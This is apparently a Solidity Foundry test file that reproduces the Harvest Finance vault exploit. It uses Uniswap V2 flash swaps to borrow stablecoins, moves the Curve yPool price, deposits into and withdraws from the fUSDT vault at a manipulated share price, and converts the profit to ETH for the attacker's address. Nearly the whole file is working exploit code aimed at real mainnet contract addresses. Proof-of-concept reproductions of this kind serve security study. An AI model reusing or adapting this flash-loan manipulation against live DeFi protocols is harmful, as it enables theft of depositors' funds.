
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/HarvestFF/interfaces/IFlashLoanReceiver.sol";
import "../src/HarvestFF/interfaces/IERC20.sol";
import "../src/HarvestFF/interfaces/IUniswapV2Router02.sol";

interface HVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 numberOfShares) external;
    function balanceOf(address account) external view returns (uint256);
}

interface yCurve {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface UniSwapV2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
    function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

contract HarvestExploitTest is Test{
    event Log(string message, uint256 val);

    // ethAddress
    address constant ETH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    // HVault
    HVault constant FARM_USDT = HVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    HVault constant FARM_USDC = HVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    // CurveStrategy
    address constant CURVE_STRATEGY = 0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c;
    
    // yCurve
    yCurve constant Y_CURVE = yCurve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);

    IERC20 constant yUSDT = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
    IERC20 constant yUSDC = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);

    IUniswapV2Pair constant uUSDT = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniswapV2Pair constant uUSDC = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    

    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f); // Uniswap V2 Factory 주소
    
    IUSDT constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    

    address private constant _USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant _USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant _WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Pair private usdcToWethPair;
    IUniswapV2Pair private usdtToWethPair;

    IUniswapV2Router02 public uniswapRouter;


    function uniswapSwapUSDCWETH(uint256 _amountIn) public payable {
        // Approve transfer of USDC token to uniswapRouter
        USDC.approve(address(uniswapRouter), _amountIn);
        // USDC.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WETH pair
        (uint256 reserveUSDC, uint256 reserveWETH, ) = usdcToWethPair.getReserves();

        // Calculate the amount of WETH to receive
        uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);

        // Swap USDC for WETH
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);
        uniswapRouter.swapExactTokensForTokens(_amountIn, amountOut, path, address(this), block.timestamp);
    }
    function uniswapSwapUSDTWETH(uint256 _amountIn) public payable {
        // Approve transfer of USDC token to uniswapRouter
        USDT.approve(address(uniswapRouter), _amountIn);
        // USDT.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WETH pair
        (uint256 reserveUSDC, uint256 reserveWETH, ) = usdtToWethPair.getReserves();

        // Calculate the amount of WETH to receive
        uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);

        // Swap USDC for WETH
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(WETH);
        uniswapRouter.swapExactTokensForTokens(_amountIn, amountOut, path, address(this), block.timestamp);
    }


    constructor() {
        // trasfer blackhole
        payable(address(0x0)).transfer(address(this).balance);
        
        usdcToWethPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(_USDC), address(_WETH)));
        usdtToWethPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(_USDT), address(_WETH)));

        uniswapRouter = IUniswapV2Router02(UNISWAP_ROUTER);


        USDC.approve(address(uUSDC), ~uint256(0));
        USDC.approve(address(FARM_USDT), ~uint256(0));
        USDC.approve(address(FARM_USDC), ~uint256(0));
        USDC.approve(address(Y_CURVE), ~uint256(0));
        USDC.approve(address(this), ~uint256(0));


        USDT.approve(address(uUSDT), ~uint256(0));
        USDT.approve(address(FARM_USDT), ~uint256(0));
        USDT.approve(address(FARM_USDC), ~uint256(0));
        USDT.approve(address(Y_CURVE), ~uint256(0));
        USDT.approve(address(this), ~uint256(0));
    }

    function testExploit() public {
        // before exploitation balance check
        emit log_named_uint("Before exploitation, USDC balance of attacker:", USDC.balanceOf(address(this)) / 1e6);
        emit log_named_uint("Before exploitation, USDT balance of attacker:",USDT.balanceOf(address(this)) / 1e6);

        // uniswap pair balance check
        emit log_named_uint("Before exploitation, USDT balance of uniswap Pair:",USDT.balanceOf(address(uUSDT)) / 1e6);
        emit log_named_uint("Before exploitation, USDC balance of uniswap Pair:",USDC.balanceOf(address(uUSDC)) / 1e6);

        // curvedY Y_CURVE pool balance check
        emit log_named_uint("[Uniswap] pair check => yCurve usdc balance:", yUSDC.balanceOf(address(Y_CURVE)) / 1e6);
        emit log_named_uint("[Uniswap] pair check => yCurve usdt balance:", yUSDT.balanceOf(address(Y_CURVE)) / 1e6);

        
        uint256 usdcFS = 100000000 * 10**6;
        uUSDT.swap(
            0,
            usdcFS,
            address(this),
            "0x"
        );
        
        uint256 _profitUSDC = USDC.balanceOf(address(this));
        uint256 _profitUSDT = USDT.balanceOf(address(this));
        emit log_named_uint("After exploitation, USDC balance of attacker:", USDC.balanceOf(address(this)) / 1e6);
        emit log_named_uint("After exploitation, USDT balance of attacker:",USDT.balanceOf(address(this)) / 1e6);

        // weth check
        emit log_named_uint("After exploitation, WETH balance of attacker:",WETH.balanceOf(address(this)) / 1e6);
        uniswapSwapUSDCWETH(_profitUSDC);
        emit log_named_uint("After exploitation, WETH balance of attacker:",WETH.balanceOf(address(this)) / 1e6);

        uniswapSwapUSDTWETH(_profitUSDT);
        emit log_named_uint("After exploitation, WETH balance of attacker:",WETH.balanceOf(address(this)) / 1e6);


        IWETH(address(WETH)).withdraw(WETH.balanceOf(address(this)));
        payable(tx.origin).transfer(address(this).balance);
        emit log_named_uint("balance:CA", address(this).balance);
        emit log_named_uint("balance:EOA", address(tx.origin).balance);
        // uint amount = 10000000 * 1e6;
        // bytes memory data = abi.encode(uUSDC, msg.sender);
        // for (uint8 i = 0; i < 1; i++) {
        //     // usdc transfer balance
        //     uUSDC.swap(
        //         amount,
        //         0,
        //         address(this),
        //         data
        //     );
        //     uniswapSwap(USDC.balanceOf(address(this)));

        //     emit Log("WETH:CA", WETH.balanceOf(address(this)));
        //     emit Log("WETH:EOA", WETH.balanceOf(address(tx.origin)));
        //     IWETH(address(WETH)).withdraw(WETH.balanceOf(address(this)));
    
        //     // payable(address(tx.origin)).call{value: address(this).balance}("");
        //     payable(tx.origin).transfer(address(this).balance);
        //     emit Log("balance:CA", address(this).balance);
        //     emit Log("balance:EOA", address(tx.origin).balance);
        // }
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        if (msg.sender == address(uUSDC)) {
            emit log_named_uint("FlashLoan:USDC:RECV", USDC.balanceOf(address(this)) / 1e6);
            {
                uint256 _usdt = USDT.balanceOf(address(this));
                uint256 _usdc = USDC.balanceOf(address(this));
                Y_CURVE.exchange_underlying(1, 2, USDC.balanceOf(address(this)), 0);

                FARM_USDT.deposit(_usdt - (100000 * 1e6));
                // vault share balance check
                uint _vaultShare = FARM_USDT.balanceOf(address(this));
                emit log_named_uint("FARM_USDT:VAULT_SHARE", _vaultShare);

                Y_CURVE.exchange_underlying(2, 1, USDT.balanceOf(address(this)), 0);

                FARM_USDT.withdraw(_vaultShare);
                uint256 _usdt_exp = USDT.balanceOf(address(this));
                uint256 _usdc_exp = USDC.balanceOf(address(this));
                emit log_named_uint("CA:EXPUSDC:", _usdc_exp / 1e6);
                emit log_named_uint("CA:EXPUSDT:", _usdt_exp / 1e6);

                USDC.transfer(address(uUSDC), _usdc * 1.00301 ether / 1 ether);
                USDT.transfer(address(uUSDT), _usdt * 1.00301 ether / 1 ether);
            }

        } else if (msg.sender == address(uUSDT)) {
            emit log_named_uint("FlashLoan:USDT:RECV", USDT.balanceOf(address(this)) / 1e6);
            uUSDC.swap(
                10000000 * 1e6,
                0,
                address(this),
                "0x"
            );
        }
    }


    // function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
    //     if (address(msg.sender) == address(uUSDT)) {
    //         // USDT -> USDC
    //         Y_CURVE.exchange_underlying(2, 1, USDT.balanceOf(address(this)), 0);
    //         FARM_USDT.withdraw(FARM_USDT.balanceOf(address(this)));
    //         USDT.transfer(address(uUSDT), amount1 * 1.00301 ether / 1 ether);
            
    //     } else if (address(msg.sender) == address(uUSDC)) {
    //         // USDC -> USDT
    //         Y_CURVE.exchange_underlying(1, 2, 10000000 * 1e6, 0);
    //         uint256 usdtBalance = USDT.balanceOf(address(this));
    //         FARM_USDT.deposit(USDT.balanceOf(address(this)));
    //         // flash swap USDT
    //         bytes memory data = abi.encode(uUSDT, msg.sender);
    //         uUSDT.swap(0, usdtBalance, address(this), data);
    //         Y_CURVE.exchange_underlying(2, 1, USDT.balanceOf(address(this)), 0);
    //         USDC.transfer(address(uUSDC), amount0 * 1.00301 ether / 1 ether);
    
    //     }
    // }
    fallback () external payable {}
}
